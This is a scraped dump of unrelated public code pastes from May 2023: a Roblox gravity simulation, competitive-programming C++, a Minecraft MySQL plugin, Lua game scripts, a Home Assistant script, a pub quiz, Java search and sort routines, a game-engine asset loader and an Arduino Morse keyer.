+
+local G = 6.6743e-11
+
+local Bodies: { Body.Body } = {}
+
+--[[ Functions ]]
+
+-- Registers a new body on the server
+local function RegisterBody(body: Body.Body)
+    table.insert(Bodies, body)
+    OnBodyRegistered:FireAllClients(body)
+end
+
+-- Steps all the physics in the server
+local function Step(dt: number)
+    for i = 1, #Bodies do
+        local body = Bodies[i]
+        
+        for j = i + 1, #Bodies do
+            local o_body = Bodies[j]
+
+            local s = body.Position - o_body.Position
+            local r = s.Magnitude
+            body.Acceleration += o_body.Mu * s / r^3
+            o_body.Acceleration += body.Mu * s / r^3
+        end
+
+        body.Velocity += body.Acceleration * dt
+    end
+
+    -- modify positions only after all velocity calcs so its all done in a static frame
+    for _, body in Bodies do
+        body.Position = body.Velocity * dt
+    end
+end
+
+--[[ Main ]]
+
+-- perform physics
+RS.Stepped:Connect(function(_, dt)
+    Step(dt)
+end)
+
+-- replicate
+RunUtils.SetInterval(SharedConfig.BodySyncInterval, function()
+    if #Bodies == 0 then return end
+    
+    local syncData = TableUtils.Map(Bodies, Body.ToSyncData)
+    OnBodySync:FireAllClients(syncData)
+end)
+
+
+--[[
+Handles a player requesting to create a new body.
+
+@params
+mu      Standard Gravitational Parameter
+
+@returns
+bool    Whether the request was accepted
+]]
+RequestNewBody.OnServerInvoke = function(player: Player, body: Body.Body): boolean
+    Body.Register(Bodies, body)
+    return true
+end
+
+
+--[[
+@returns
+The current bodies and their states.
+]]
+GetAllBodyReplicationData.OnServerInvoke = function(player: Player): { Body.BodyReplicationData }
+    return TableUtils.Map(Bodies, Body.ToReplicationData)
+end
+
+--[[
+@returns
+The data for the requested body.
+]]
+GetBodyData.OnServerInvoke = function(player: Player, id: number): Body.Body
+    return Bodies[id]
+end
+
+"
+VTWiCdT6,Untitled,Salvens,C++,Sunday 14th of May 2023 03:31:59 PM CDT,"#include <algorithm>
+#include <iostream>
+#include <iomanip>
+#include <cmath>
+#include <vector>
+#include <set>
+#include <map>
+#include <string>
+#include <cassert>
+#include <numeric>
+#include <queue>
+using namespace std;
+
+#define int long long
+#define IOS ios::sync_with_stdio(false); cin.tie(0); cout.tie(0);
+
+const long long INF = 1e18 + 7;
+const double EPS = 1e-9;
+const int N = 1000;
+const int MOD = 1e9 + 7;
+
+int a[N][N], ans[N][N];
+int units;
+
+void read(int n) {
+    for (int i = 0; i < n; ++i) {
+        for (int j = 0; j < n; ++j) {
+            char c;
+            cin >> c;
+            a[i][j] = (int)(c - '0');
+        }
+    }
+}
+
+void solve() {
+    int n;
+    cin >> n;
+    read(n);
+
+    for (int i = n - 1; i >= 0; --i) {
+        for (int j = i + 1; j < n; ++j) {
+            bool print = false;
+            if (i + 1 == j) {
+                ans[i][j] = a[i][j];
+                continue;
+            }
+            int s = 0;
+            for (int k = i + 1; k < j; ++k)  {
+                s += (ans[k][j] != 1) ? 0: a[i][k];
+                units = s % 10;
+            }
+            if (a[i][j] == (units + 1) % 10) {
+                ans[i][j] = 1;
+            } else {
+                ans[i][j] = 0;
+            }
+        }
+    }
+//    cout << 123 << endl;
+    for (int i = 0; i < n; ++i) {
+        for (int j = 0; j < n; ++j) {
+            cout << ans[i][j];
+        }
+        cout << '\n';
+    }
+}
+
+int32_t main() {
+    IOS;
+
+    int tt = 1;
+//    cin >> t;
+    while (tt--) {
+        solve();
+    }
+    return 0;
+}
+
+/*
+1.  数组开够了没
+2.  文件名写对了没，文件夹建了吗
+3.  内存会不会MLE
+4.  多测清空？
+5.  调试删干净了没
+6.  取模有没有溢出
+7.  快速幂底数要取模，幂对 mod-1 取模
+8.  前向星和欧拉序要开2倍数组
+9.  比较函数如果值相同的话有没有第二优先级
+10. 线段树 4 倍空间，线段树合并和可持久化线段树 32 倍空间
+11. 看清楚 log 的底数是啥，log后面的数是啥
+12. long long 只有正负 2^63-1
+*/
+
+"
+QhDwLEAw,Untitled,Overwtime,Java,Sunday 14th of May 2023 03:13:32 PM CDT,"@Override
+    public void onEnable() {
+		loadConfig();
+		PluginManager pm = getServer().getPluginManager();
+        String url = ""jdbc:mysql://"" + hostname + ""/"" + database + connectionParameters;
+        try {
+            connection = DriverManager.getConnection(url, user, password);
+            logger.info(""Successfully connected to database!"");
+        } catch (SQLException e) {
+        	logger.severe(""Failed to connect to database!"");
+            e.printStackTrace();
+            pm.disablePlugin(this);
+        }
+        try (Statement statement = connection.createStatement()) {
+            statement.executeUpdate(
+                ""CREATE TABLE IF NOT EXISTS players (""
+                + ""id INT AUTO_INCREMENT PRIMARY KEY,""
+                + ""Players VARCHAR(255) NOT NULL,""
+                + ""Time BIGINT NOT NULL""
+                + "")"");
+            logger.info(""Table 'players' created successfully."");
+        } catch (SQLException e) {
+            getLogger().severe(""Failed to create table 'players'!"");
+            e.printStackTrace();
+        }
+        try (Statement statement = connection.createStatement()) {
+            statement.executeUpdate(
+                ""CREATE TABLE IF NOT EXISTS Time (""
+                + ""id INT AUTO_INCREMENT PRIMARY KEY,""
+                + ""Players VARCHAR(255) NOT NULL,""
+                + ""Time BIGINT NOT NULL""
+                + "")"");
+            logger.info(""Table 'Time' created successfully."");
+        } catch (SQLException e) {
+            getLogger().severe(""Failed to create table 'Time'!"");
+            e.printStackTrace();
+        }
+        pm.registerEvents(new EventListener(this), this);
+    }
+	
+	public void loadConfig() {
+		saveDefaultConfig();
+		FileConfiguration config = getConfig();
+		sessiontime = config.getInt(""sessiontime"");
+		ConfigurationSection storage = config.getConfigurationSection(""storage"");
+		hostname = storage.getString(""hostname"");
+		user = storage.getString(""user"");
+		password = storage.getString(""password"");
+		database = storage.getString(""database"");
+		connectionParameters = storage.getString(""connection-parameters"");
+	}
+
+    @Override
+    public void onDisable() {
+        // Закрытие соединения с базой данных
+        try {
+            if (connection != null && !connection.isClosed()) {
+                connection.close();
+                logger.info(""Successfully closed database connection!"");
+            }
+        } catch (SQLException e) {
+        	logger.severe(""Failed to close database connection!"");
+            e.printStackTrace();
+        }
+    }"
+F7Z0Tkkk,Untitled,Overwtime,Java,Sunday 14th of May 2023 03:13:02 PM CDT,"public class Database {
+	
+	private final Main plugin;
+	
+	public Database(Main instance) {
+	    this.plugin = instance;
+	}
+	
+	public void addPlayer(String player, long time) {
+	    // Проверяем, существует ли игрок в базе данных
+	    if (isInDatabase(player)) {
+	        plugin.logger.warning(""Player "" + player + "" is already in database!"");
+	        return;
+	    }
+	    // Добавляем игрока в базу данных
+	    String query = ""INSERT INTO players (Players, Time) VALUES (?, ?)"";
+	    try (PreparedStatement statement = plugin.connection.prepareStatement(query)) {
+	        statement.setString(1, player);
+	        statement.setLong(2, time);
+	        statement.executeUpdate();
+	    } catch (SQLException e) {
+	        plugin.logger.severe(""Failed to add player to database!"");
+	        e.printStackTrace();
+	    }
+	}
+
+	public boolean removePlayer(String player) {
+	    String query = ""DELETE FROM players WHERE Players = ?"";
+	    try (PreparedStatement statement = plugin.connection.prepareStatement(query)) {
+	        statement.setString(1, player);
+	        int rowsDeleted = statement.executeUpdate();
+	        return rowsDeleted > 0;
+	    } catch (SQLException e) {
+	        plugin.logger.severe(""Failed to remove player from database!"");
+	        e.printStackTrace();
+	    }
+
+	    return false;
+	}
+
+	public long getPlayerTime(String player) {
+		long time = -1;
+	    String query = ""SELECT Time FROM players WHERE Players = ?"";
+	    try (PreparedStatement statement = plugin.connection.prepareStatement(query)) {
+	        statement.setString(1, player);
+	        ResultSet resultSet = statement.executeQuery();
+	        if (resultSet.next()) {
+	        	time = resultSet.getLong(""Time"");
+	        }
+	    } catch (SQLException e) {
+	        plugin.logger.severe(""Failed to get player time from database!"");
+	        e.printStackTrace();
+	    }
+	    return time;
+	}
+
+    public boolean isInDatabase(String player) {
+        // Проверка наличия таблицы ""players"" в базе данных
+        if (!isTableExists()) {
+            return false;
+        }
+        // Проверка наличия игрока в базе данных
+        String query = ""SELECT COUNT(*) FROM players WHERE Players = ?"";
+        try (PreparedStatement statement = plugin.connection.prepareStatement(query)) {
+            statement.setString(1, player);
+            ResultSet resultSet = statement.executeQuery();
+            resultSet.next();
+            int count = resultSet.getInt(1);
+            return count > 0;
+        } catch (SQLException e) {
+            plugin.logger.severe(""Failed to check if player is in database!"");
+            e.printStackTrace();
+        }
+
+        return false;
+    }
+    
+    public boolean isTableExists() {
+        try (ResultSet resultSet = plugin.connection.getMetaData().getTables(null, null, ""players"", null)) {
+            return resultSet.next();
+        } catch (SQLException e) {
+            plugin.logger.severe(""Failed to check if table exists!"");
+            e.printStackTrace();
+        }
+        return false;
+    }
+
+}"
+0v5RJdjX,Untitled,Nikita051,C++,Sunday 14th of May 2023 02:48:07 PM CDT,"#include <iostream>
+using namespace std;
+
+int main()
+{
+	setlocale(0, """");
+	int weight, height;
+	cout << ""Введите свой вес: "";
+	cin >> weight;
+	cout << ""Введите свой рост: "";
+	cin >> height;
+
+	if (40 <= weight <= 47 && 145 <= height <= 159) {
+		cout << ""XXS"";
+	}
+	else if (46 <= weight <= 53 && 152 <= height <= 165) {
+		cout << ""XS"";
+	}
+	else if (54 <= weight <= 59 && 160 <= height <= 170) {
+		cout << ""S"";
+	}
+	else if (60 <= weight <= 66 && 160 <= height <= 175) {
+		cout << ""M"";
+	}
+	else if (67 <= weight <= 77 && 165 <= height <= 176) {
+		cout << ""L"";
+	}
+	else if (75 <= weight <= 82 && 168 <= height <= 180) {
+		cout << ""XL"";
+	}
+	cout << "" Ваш вес - "" << weight << "" Ваш рост - "" << height;
+}
+"
+Zc0qkw9z,PulverizerScript,Damber00593,Lua,Sunday 14th of May 2023 02:27:43 PM CDT,"local t = peripheral.wrap(""bottom"")
+local glasses = peripheral.wrap(""top"")
+
+while true do
+	local OutS1name = "" ""
+    local OutS1id = 0
+    local OutS1qty = 0
+	local InS1name = "" ""
+	local InS1id = 0
+	local InS1qty = 0
+
+	glasses.clear()
+	glasses.addBox(1,1,150,150,0xFFFFFF,0.2)
+	if(t.getStackInSlot(2) == null) then
+    else
+        for i,v in pairs(t.getStackInSlot(2)) do
+        	if (i == ""name"") then
+				OutS1name = v
+            elseif (i == ""id"") then
+                OutS1id = v
+            elseif (i == ""qty"") then
+                OutS1qty = v
+            end
+        end
+	end
+	if(t.getStackInSlot(1) == null) then
+    else
+       	for i,v in pairs(t.getStackInSlot(1)) do
+       		if (i == ""name"") then
+				InS1name = v
+			elseif (i == ""id"") then
+				InS1id = v
+        	elseif (i == ""qty"") then
+           	    InS1qty = v
+           	end
+      	end
+	end
+	glasses.addText(3,10,""--------IN--------|--------OUT--------"")
+   	glasses.addText(3,20,InS1name ..""(""..InS1id .."")    |    ""..OutS1name ..""(""..OutS1id.."")"")
+	glasses.addText(3,30,""Qty: ""..InS1qty..""    |    Qty: ""..OutS1qty)
+    sleep(1)
+end"
+sEga8Rej,Untitled,Salvens,C++,Sunday 14th of May 2023 01:52:59 PM CDT,"#include <algorithm>
+#include <iostream>
+#include <iomanip>
+#include <cmath>
+#include <vector>
+#include <set>
+#include <map>
+#include <string>
+#include <cassert>
+#include <numeric>
+#include <queue>
+using namespace std;
+
+#define int long long
+#define IOS ios::sync_with_stdio(false); cin.tie(0); cout.tie(0);
+
+const long long INF = 1e9 + 7;
+const double EPS = 1e-9;
+const int N = 1e5 + 1000;
+const int MOD = 1e9 + 7;
+
+struct segtree {
+
+    vector<long long> tree;
+    int size;
+
+    void Init(int n) {
+        size = 1;
+        while (size < n) {
+            size *= 2;
+        }
+        tree.assign(2 * size - 1, 0);
+    }
+
+    void Set(int i, int v, int x, int lx, int rx) {
+        if (rx - lx == 1) {
+            tree[x] = v;
+            return;
+        }
+        int m = (lx + rx) / 2;
+        if (i < m) {
+            Set(i, v, 2 * x + 1, lx, m);
+        } else {
+            Set(i, v, 2 * x + 2, m, rx);
+        }
+        tree[x] = tree[x * 2 + 1] + tree[2 * x + 2];
+    }
+
+    void Set(int i, int v) {
+        Set(i, v, 0, 0, size);
+    }
+
+    long long Sum(int l, int r, int x, int lx, int rx) {
+        if (l >= rx || lx >= r) {
+            return 0;
+        }
+        if (lx >= l && rx <= r) {
+            return tree[x];
+        }
+        int m = (lx + rx) / 2;
+        long long s1 = Sum(l, r, 2 * x + 1, lx, m);
+        long long s2 = Sum(l, r, 2 * x + 2, m, rx);
+        return s1 + s2;
+    }
+
+    long long Sum(int l, int r) {
+        return Sum(l, r, 0, 0, size);
+    }
+};
+
+void solve() {
+    int n, k, d;
+    cin >> n >> k >> d;
+    vector<int> a(n + 1);
+    for (int i = 1; i <=n; ++i) {
+        cin >> a[i];
+    }
+    sort(a.begin() + 1, a.end());
+    a[0] = a[1];
+
+    vector<bool> dp(n + 1, false);
+    dp[0] = true;
+
+    segtree st;
+    st.Init(n + 1);
+    st.Set(0, 1);
+
+    for (int i = 1; i < n + 1; ++i) {
+        int r = i - k + 1;
+        int l= lower_bound(a.begin(), a.end(), a[i] - d) - a.begin();
+//        cout << i << ' ' << l << ' ' << r << endl;
+        if (l <= r && l >= 0) {
+            --l;
+            int sum = st.Sum(l, r);
+            if (sum) {
+                dp[i] = true;
+                st.Set(i, 1);
+            }
+        }
+    }
+//    for (int i = 0; i <= n; ++i) {
+//        cout << a[i] << ' ';
+//    }
+//    cout << endl;
+//    for (int i = 0; i <= n; ++i) {
+//        cout << dp[i] << ' ';
+//    }
+//    cout << endl;
+    if (dp[n]) {
+        cout << ""YES\n"";
+    } else {
+        cout << ""NO\n"";
+    }
+}
+
+int32_t main() {
+    IOS;
+
+    int tt = 1;
+//    cin >> t;
+    while (tt--) {
+        solve();
+    }
+    return 0;
+}
+
+/*
+1.  数组开够了没
+2.  文件名写对了没，文件夹建了吗
+3.  内存会不会MLE
+4.  多测清空？
+5.  调试删干净了没
+6.  取模有没有溢出
+7.  快速幂底数要取模，幂对 mod-1 取模
+8.  前向星和欧拉序要开2倍数组
+9.  比较函数如果值相同的话有没有第二优先级
+10. 线段树 4 倍空间，线段树合并和可持久化线段树 32 倍空间
+11. 看清楚 log 的底数是啥，log后面的数是啥
+12. long long 只有正负 2^63-1
+*/
+
+"
+DWjzhEUV,Untitled,LA_,YAML,Sunday 14th of May 2023 01:52:46 PM CDT,"switch_on_tv_and_change_input_source:
+  description: Switch on TV, if off and changes TV input source
+  fields:
+    input_source:
+      name: Input source
+      required: true
+      example: HW1
+      selector:
+        select:
+          options:
+          - HW1
+          - HW2
+          - HW3
+          - HW4
+          - five
+          - ru.yourok.num
+          - ru.kinopoisk.tv
+          - ru.more.play
+          - YouTube
+          - unknown
+  sequence:
+    condition:
+    - condition: state
+      entity_id: media_player.androidtv
+      state: off
+    action:
+    - service: homeassistant.turn_on
+      target:
+        entity_id: media_player.androidtv
+    - delay: 00:00:05        
+    - service: script.change_tv_input_source
+      data:
+        input_source: input_source"
+PFpk2Efs,ka-wizz,madra,Go,Sunday 14th of May 2023 01:42:31 PM CDT,"(1)  First, some people whose names include the name ‘May’. Name those Mays.
+ a HE WILL, HE WILL ROCK YOU. ROCK YOU. -- BRIAN MAY
+ 
+ b SHE CREATED THE SISTERS MEG, JO, BETH AND AMY -- 
+ 
+ c HE OWNS A 2015 FERRARI 458 SPECIALE, A 2010 PORSCHE 911 CARRERA S FACELIFT, A 2016 BMW I3, AND VARIOUS OTHER VEHICLES INCLUDING A VW BEACH BUGGY AND A TESLA -- JAMES MAY
+ 
+ d COSTELLO IN RAIN DOGS, KERRY IN THIS COUNTRY AND OTTER IN THE MASKED SINGER --
+ 
+ e MANCHESTER UNITED PAID £1.2m FOR HIM IN 1994 -- 
+ 
+ f SPIDER-MAN’S PRIMARY CAREGIVER -- 
+ 
+ g BRITAIN’S MOST NOTORIOUS VANDALISER OF WHEAT FIELDS -- 
+ 
+ h AND CAN YOU REMEMBER THE NAME OF THE HUSBAND OF THE PREVIOUS ANSWER? -- 
+ 
+(2)  Next, a celebration of various things that happen when the weather warms up and May gets into its swing (apart from the publication of The Last Devil to Die).
+ a BECAUSE IT MAKES A PUN, ON WHICH DATE DO STAR WARS FANS CELEBRATE? -- 4th MAY
+ 
+ b THE F.A. CUP FINAL IS GENERALLY PLAYED IN WEMBLEY IN THE MIDDLE OF MAY. WHERE DID IT TAKE PLACE IN SEASONS FOLLOWING THE MILLENNIUM? -- MILLENIUM STADIUM, CARDIFF
+ 
+ c MAY MEANS EUROVISION. THE BBC HAS ARRANGED APPEARANCES IN EASTENDERS, BARGAIN HUNT AND POINTLESS FOR MEMBERS OF WHICH 1981-WINNING ACT? -- BUCKS FIZZ
+ 
+ d LATVIA ARE NOTORIOUSLY UNLUCKY IN EUROVISION AND DIDN’T ENTER UNTIL THE YEAR 2000. THE TWO OTHER BALTIC STATES TOOK PART AS SOON AS THEY COULD, IN 1994. NAME EITHER OF THEM. -- LITHUANIA 
+ 
+ e AND NOW NAME THE OTHER. -- ESTONIA
+ 
+ f THE OTHER BIG MAY EVENT IS THE ONE IN WESTMINSTER ABBEY, WHICH IS HOSTING THE STONE OF DESTINY. BY WHAT OTHER NAME IS THAT STONE REFERRED TO IN SCOTLAND? -- SCONE
+ 
+ g AND WHAT WAS THE SECOND-TO-TOP ITEM IN THE NEWS ON THE DAY OF THE PREVIOUS CORONATION? -- CONQUEST OF EVEREST
+ 
+(3)  Now it’s time to celebrate some May birthdays. All the answers are notable for (i) having a birthday that falls in May, despite (ii) being totally fictional.
+ • May 5th, 1970: CHANDLER’S PARTNER’S BROTHER’S PARTNER --
+ 
+ • May 9th, 1955: HE PLAYS BOB CRATCHIT IN A MUPPET CHRISTMAS CAROL --
+ 
+ • May 23th,1955: SHOELESS, VEST-WEARING THWARTER OF TERRORISTS -- 
+ • May 9th, 1981: SHE WEARS A RED DRESS AND PEARLS AND PLAYS BARITONE SAX -- THAT RABBIT THING
+ 
+ • May 29th, 1970: AVENGER SO NAMED BECAUSE OF HIS SUIT OF ARMOUR -- 
+ 
+ • May 15th, 1959: HEAD OF DIAGNOSTIC MEDICINE, PRINCETON-PLAINSBORO TEACHING HOSPITAL --
+ 
+ • May 28th, 1908: CAT-STROKING ANTAGONIST IN EIGHT BOND FILMS AND COUNTING -- BLOFELD
+ 
+ • May 15th, 1990: FRASIER CHARACTER PLAYED BY ONE ACTOR AND THEN BY HIS SON --
+ 
+(4)  Back to Eurovision. The contest has seen, of course, some extraordinary song titles. I’m sure you remember San Marino’s ‘The Social Network Song (Oh Oh, Uh, Oh Oh)’ and West Germany’s unforgettable ‘Genghis Khan’. So I’ve turned to Junior Eurovision. Below are ten entries. Five really happened. The others I’ve just made up. So tell me: Sam Ryder or Sam Lie-der?
+ • ‘HE IS A BOULDER’ BY KLAARTJE & NICKY (NETHERLANDS, 2004)
+ • ‘DON’T TOUCH MY TREE’ BY ANA KODRA (ALBANIA, 2017)
+ • ‘TECHNO FOLK HEAVY-METAL DISCO BALLAD’ BY X-CELL (MONTENEGRO, 2013)
+ • ‘WE WILL PAY YOU IF WE WIN (JUST KIDDING)’ BY PRINCE ALFONSO (SAN MARINO, 2005)
+ • ‘I’D RATHER BE DEAD THAN HOMELY’ BY MARÍA ISABEL (SPAIN, 2004)
+ • ‘BOSNIA AND HERZEGOVINA’ BY BOSNIA AND HERZEGOVINA (BOSNIA AND HERZEGOVINA, 2019)
+ • ’FUNKY LEMONADE’ BY FUNKIDS (GEORGIA, 2012)
+ • ‘I WIN EVERY CHESS GAME’ BY GRANDMASTER ZOLTAN (HUNGARY, 2015)
+ • ‘BLOODY HELL’ BY THREE RUDE LASSES (AUSTRALIA, 2006)
+ • ‘WE ARE LEARNING FOREIGN LANGUAGES’ BY FEARLESS FOREIGN LANGUAGE TEACHERS (SERBIA, 2006)
+(5)  Last, each of the answers in this final set contains the word “May”.
+ a WHICH HARD-HITTING SERIES DEVISED BY MICHAELA COEL HAS WON JUST ABOUT EVERY BAFTA GOING?
+ b WHAT VESSEL DOCKED IN MASSACHUSETTS ON NOVEMBER 21ST, 1620?
+ c CATHERINE ZETA-JONES GOT HER BIG BREAK IN WHICH KENT-BASED TV SERIES?
+ d WHAT DOES ‘YMMV’ STAND FOR IN A CAR AD (OR WHEN USED FIGURATIVELY)?
+ e WHO DOES ROD STEWART WAKE UP AT THE START OF A 1971 NUMBER-ONE SINGLE?
+ f IN THE CHILDREN’S SINGING GAME, WHAT DO WE COME DOING ON A COLD AND FROSTY MORNING?
+ g WHAT WARNING LABEL ALWAYS PROMPTS AMUSEMENT WHEN IT APPEARS ON A PACKET OF DRY ROASTED?"
+VUfNJD75,Student,I_Mimic_I,Java,Sunday 14th of May 2023 01:26:51 PM CDT,"public record Student(String lastName, String firstName, String surname, int scoreBookNumber, boolean militaryTraining) {
+}
+"
+KP63Vzt6,Interpolation search,I_Mimic_I,Java,Sunday 14th of May 2023 01:25:35 PM CDT,"    public static boolean isMilitaryTraining(Student[] students, int scoreBookNumber) {
+        var result = find(students, 0, students.length - 1, scoreBookNumber);
+        if (result == null) {
+            return false;
+        } else {
+            return result.militaryTraining();
+        }
+    }
+
+    public static Student find(Student[] students, int left, int right, int key) {
+        if (left > right) {
+            return null;
+        }
+        int median = left + (right - left) * (key - students[left].scoreBookNumber()) /
+                (students[right].scoreBookNumber() - students[left].scoreBookNumber());
+        if (students[median].scoreBookNumber() == key) {
+            return students[median];
+        }
+        if (left == right) {
+            return null;
+        }
+        if (students[median].scoreBookNumber() > key) {
+            return find(students, left, median - 1, key);
+        } else {
+            return find(students, median + 1, right, key);
+        }
+    }"
+VvYTQFBh,Untitled,Frogbutt,Lua,Sunday 14th of May 2023 01:24:51 PM CDT,"-- Trigger type: Custom
+-- Trigger function: Event
+-- Event(s): UNIT_AURA player
+
+function(event)
+    -- Get the duration and expiration time of Divine Resonance
+    local name1, _, _, _, duration1, expirationTime1 = AuraUtil.FindAuraByName(""Divine Resonance"", ""player"")
+    -- Get the duration and expiration time of Bestow Faith
+    local name2, _, _, _, duration2, expirationTime2 = AuraUtil.FindAuraByName(""Bestow Faith"", ""player"")
+    -- Check if both buffs are active
+    if name1 and name2 then
+        -- Calculate the remaining time of both buffs
+        local remaining1 = expirationTime1 - GetTime()
+        local remaining2 = expirationTime2 - GetTime()
+        -- Round down the remaining time of Divine Resonance to the nearest 5 seconds
+        local rounded1 = math.floor(remaining1 / 5) * 5
+        -- Compare the remaining time of both buffs and return the buff with the shortest duration
+        if rounded1 < remaining2 then
+            -- Return Divine Resonance as the buff with the shortest duration
+            aura_env.duration = rounded1 -- Store the duration in aura_env table
+            aura_env.total = duration1 -- Store the total duration in aura_env table
+            aura_env.name = name1 -- Store the name in aura_env table
+            return true
+        else
+            -- Return Bestow Faith as the buff with the shortest duration
+            aura_env.duration = remaining2 -- Store the duration in aura_env table
+            aura_env.total = duration2 -- Store the total duration in aura_env table
+            aura_env.name = name2 -- Store the name in aura_env table
+            return true
+        end
+    else
+        -- Return false if either buff is not active
+        return false
+    end
+end
+
+-- Untrigger function: None
+
+-- Duration Info: Custom Function
+
+function()
+    -- Return the dynamic information of the buff with the shortest duration from aura_env table
+    return aura_env.duration, aura_env.total, aura_env.name
+end"
+0YvwJh8B,Binary sort,I_Mimic_I,Java,Sunday 14th of May 2023 01:24:10 PM CDT,"    public static void bubbleSort(Student[] students) {
+        for (var i = 0; i < students.length; i++) {
+            for (var j = 0; j < students.length - i - 1; j++) {
+                if (students[j + 1].militaryTraining() && !students[j].militaryTraining()) {
+//                if (students[j + 1].scoreBookNumber() < students[j].scoreBookNumber()) {
+                    var temp = students[j];
+                    students[j] = students[j + 1];
+                    students[j + 1] = temp;
+                }
+            }
+        }
+    }"
+rDxfEAYx,Directory Tree,Zgragselus,C++,Sunday 14th of May 2023 12:52:13 PM CDT,"void DirectoryTree::ProcessFile(Record* r, const std::string& file, const std::vector<std::string>& files)
+{
+	Engine::LoaderDevIL textureLoader(mLog);
+	Engine::LoaderAssimp modelLoader(mLog, mRenderer);
+	modelLoader.SetManagers(mMeshManager, mModelManager, mTextureManager);
+	modelLoader.SetTextureHeap(mRenderer->Heap(), nullptr);
+
+	if ((file.find("".tga"") != std::string::npos) || (file.find("".png"") != std::string::npos))
+	{
+		Engine::Manager<Engine::Texture>::Node* node = mTextureManager->GetNode(file);
+
+		Engine::LoaderDevIL::Image* image = textureLoader.Load(file);
+		if (image != nullptr)
+		{
+			image->mUseAlphaMipmap = false;
+			textureLoader.GenerateMipmaps(image);
+		}
+		Engine::Texture* t = new Engine::Texture(file);
+		t->InitMipmaps(mRenderer, image->mWidth, image->mHeight, 1, image->mMipLevels, Engine::Graphics::RGBA8, (const void**)image->mMipmaps);
+		t->SetName(file);
+		if (node == nullptr)
+		{
+			mTextureManager->Insert<Engine::Texture>(file, t);
+			node = mTextureManager->GetNode(file);
+		}
+		else
+		{
+			delete node->mItem;
+			node->mItem = t;
+		}
+		delete image;
+
+		r->mResourceType = ResourceType::TEXTURE;
+		r->mResource = node;
+	}
+	else if (file.find("".obj"") != std::string::npos)
+	{
+		Engine::Manager<Engine::Model>::Node* node = mModelManager->GetNode(file);
+
+		Engine::Model* mdl = modelLoader.Load(file);
+		if (node == nullptr)
+		{
+			mModelManager->Insert<Engine::Model>(file, mdl);
+			node = mModelManager->GetNode(file);
+		}
+		else
+		{
+			delete node->mItem;
+			node->mItem = mdl;
+		}
+		
+		r->mResourceType = ResourceType::MODEL;
+		r->mResource = node;
+	}
+	else if (file.find("".cpp"") != std::string::npos)
+	{
+		// Check if there isn't dll that corresponds to the cpp file
+		bool compile = true;
+		for (size_t i = 0; i < files.size(); i++)
+		{
+			if ((files[i].substr(0, files[i].length() - 4) == file.substr(0, file.length() - 4)) &&
+				(files[i].find("".dll"") != std::string::npos))
+			{
+				// If such dll exists, check if its write time is greater than cpp write time
+				if (Engine::Files::GetWriteTime(files[i]) > Engine::Files::GetWriteTime(file))
+				{
+					// In such case our dll is most-recent version of the script, we don't need to compile
+					compile = false;
+				}
+			}
+		}
+
+		// If we need to compile, build the dll
+		if (compile)
+		{
+			// TODO: Compiler call
+			// Temporary hard-coded compiler
+			std::string command = std::string(""\""C:/Program Files (x86)/Microsoft Visual Studio/2019/Community/VC/Auxiliary/Build/vcvarsall.bat/\"" amd64 && \
+				\""C:/Program Files (x86)/Microsoft Visual Studio/2019/Community/VC/Tools/MSVC/14.20.27508/bin/Hostx64/x64/cl.exe/\"" /O2 /EHsc /GL /MD /I \
+				\""../../../Source/\"" \
+				/LD \
+				DemoController.cpp \
+				\""../../../Bin64/Core.lib\"" \
+				DemoController.dll > Build.log"");
+
+			// Compile
+			//system(command.c_str());
+		}
+	}
+	else if (file.find("".dll"") != std::string::npos)
+	{
+		Engine::Manager<Engine::Plugin>::Node* node = mPluginManager->GetNode(file);
+
+		mLog->Print(""Plugin"", std::string(""Loading plugin: "") + file);
+		Engine::Plugin* plugin = new Engine::Plugin(file);
+		void* create = plugin->GetProc<void*>(""CreateBehavior"");
+		void* name = plugin->GetProc<void*>(""GetName"");
+		const char* (*fn)() = (const char*(*)())name;
+		const char* pluginName = (*fn)();
+
+		if (create == nullptr || name == nullptr)
+		{
+			mLog->Print(""Plugin"", std::string(""CreateBehavior or GetName function not found!""));
+			delete plugin;
+		}
+		else
+		{
+			mLog->Print(""Plugin"", std::string(""CreateBehavior and GetName function found!""));
+			mLog->Print(""Plugin"", std::string(""Initializing plugin with name: "") + pluginName);
+
+			if (node == nullptr)
+			{
+				mPluginManager->Insert<Engine::Plugin>(file, plugin);
+				node = mPluginManager->GetNode(file);
+
+				//Engine::ComponentTypeId::Get(pluginName);
+			}
+			else
+			{
+				delete node->mItem;
+				node->mItem = plugin;
+			}
+
+			r->mResourceType = ResourceType::SCRIPT;
+			r->mResource = node;
+		}
+	}
+}"
+y0suugjr,Arduino morse keyer circuit for paddle,zamzara,C,Sunday 14th of May 2023 12:45:20 PM CDT,"// keyer circuit for paddle key to drive straight key input
+
+// pins for I/O connectors
+#define DOT_IN     10
+#define DASH_IN    11
+#define KEY_OUT    12
+#define LAMP_OUT   13
+
+//potential improvement - add a trimemr pot for wpm
+#define WPM          15
+
+// WPM -> ms per dot unit, 50 units is a word
+#define DOT_LENGTH   60000/(WPM*50) //ms
+
+void setup() {
+  // put your setup code here, to run once:
+  pinMode(DOT_IN, INPUT_PULLUP);
+  pinMode(DASH_IN, INPUT_PULLUP);
+  pinMode(KEY_OUT, OUTPUT);
+  pinMode(LAMP_OUT, OUTPUT);
+  digitalWrite(KEY_OUT, 1);
+  digitalWrite(LAMP_OUT, 0);
+  test();
+  test();
+  test();
+}
+
+void loop() {
+  bool  dot  = digitalRead(DOT_IN);
+  bool  dash = digitalRead(DASH_IN);
+  
+  // NB both inputs and output are active low
+  
+  if(dot==0 && dash==1)
+  {
+    send_dot();
+  }
+  if(dot==1 && dash==0)
+  {
+    send_dash();
+  }
+  // tuning tone if both pushed, I don't do iambic mode
+  if(dot==0 && dash==0)
+  {
+    digitalWrite(KEY_OUT, 0);
+    digitalWrite(LAMP_OUT, 1);
+  }
+  if(dot==1 && dash==1)
+  {
+    digitalWrite(KEY_OUT, 1);
+    digitalWrite(LAMP_OUT, 0);
+  }
+}
+
+void send_dot() {
+  digitalWrite(KEY_OUT, 0);
+  digitalWrite(LAMP_OUT, 1);
+  delay(DOT_LENGTH);
+  digitalWrite(KEY_OUT, 1);
+  digitalWrite(LAMP_OUT, 0);
+  delay(DOT_LENGTH);
+}
+
+void send_dash() {
+  digitalWrite(KEY_OUT, 0);
+  digitalWrite(LAMP_OUT, 1);
+  delay(DOT_LENGTH * 3);
+  digitalWrite(KEY_OUT, 1);
+  digitalWrite(LAMP_OUT, 0);
+  delay(DOT_LENGTH);
+}
+
+void test() {
+  digitalWrite(LAMP_OUT,1);
+  delay(50);
+  digitalWrite(LAMP_OUT,0);
+  delay(100);
+}"
